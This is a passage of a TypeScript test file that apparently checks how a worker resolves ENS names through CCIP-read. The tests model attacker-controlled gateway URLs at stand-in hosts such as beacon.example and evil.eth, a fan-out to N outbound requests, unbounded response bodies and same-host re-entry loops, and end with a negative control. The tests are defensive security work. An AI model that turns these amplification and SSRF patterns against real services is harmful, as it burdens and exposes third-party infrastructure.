    // consumer bails one chunk past the cap; the stream's default queuing
    // strategy may have pulled one further ahead, hence the +2 tolerance.
    const capInChunks = AVATAR_MAX_BYTES / CHUNK_SIZE // 80
    expect(guarded.state.pulled).toBeLessThan(CHUNKS)
    expect(guarded.state.pulled).toBeGreaterThanOrEqual(capInChunks)
    expect(guarded.state.pulled).toBeLessThanOrEqual(capInChunks + 2)

    // The asymmetry, in one line: same body, same worker, same egress.
    expect(ccip.state.pulled).toBeGreaterThan(guarded.state.pulled * 3)
  })

  it('tries every URL in urls[] — one resolution, N outbound requests', async () => {
    // urls[] length is attacker-chosen and unbounded. Each entry that fails is
    // followed by the next, so a single OG render fans out to all of them.
    const urls = [
      'https://beacon.example/a',
      'https://beacon.example/b',
      'https://beacon.example/c',
    ]
    const seen: string[] = []
    const { gateway } = installNetwork(urls, async (url) => {
      seen.push(url)
      return new Response('not CCIP data', { status: 502 })
    })

    await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(gateway).toHaveBeenCalledTimes(urls.length)
    expect(seen).toEqual(urls) // tried in attacker-specified order
  })

  it('can re-enter resolution before discovering the response is not CCIP data', async () => {
    // Model only the routing assumption: a same-host OG fetch invokes the
    // resolution entry point again. Three calls are a TEST cap, not Cloudflare's
    // loop limit. This deliberately does not model rendering, caches or billing.
    let reentries = 0
    const { gateway } = installNetwork(OG_URL, async () => {
      reentries += 1
      if (reentries < 3) await fetchEnsData(env, 'evil.eth', SELF_HOST)
      return new Response('invalid CCIP response', { status: 502 })
    })

    await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(reentries).toBe(3)
    expect(gateway).toHaveBeenCalledTimes(3)
  })

  it('does not fetch the gateway when CCIP is disabled (negative control)', async () => {
    const { gateway, rpc } = installNetwork(OG_URL)
    const client = clients.createClient(env)
    // Construct a new client: spreading an existing public client preserves
    // action closures bound to its original CCIP-enabled configuration.
    vi.spyOn(clients, 'createClient').mockReturnValue(
      createPublicClient({
        chain: client.chain,
        transport: fallback([http(RPC_URL)]),
        batch: { multicall: true },
        ccipRead: false,
      }),
    )

    await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(rpc).toHaveBeenCalled()
    expect(gateway).not.toHaveBeenCalled()
  })
})
```
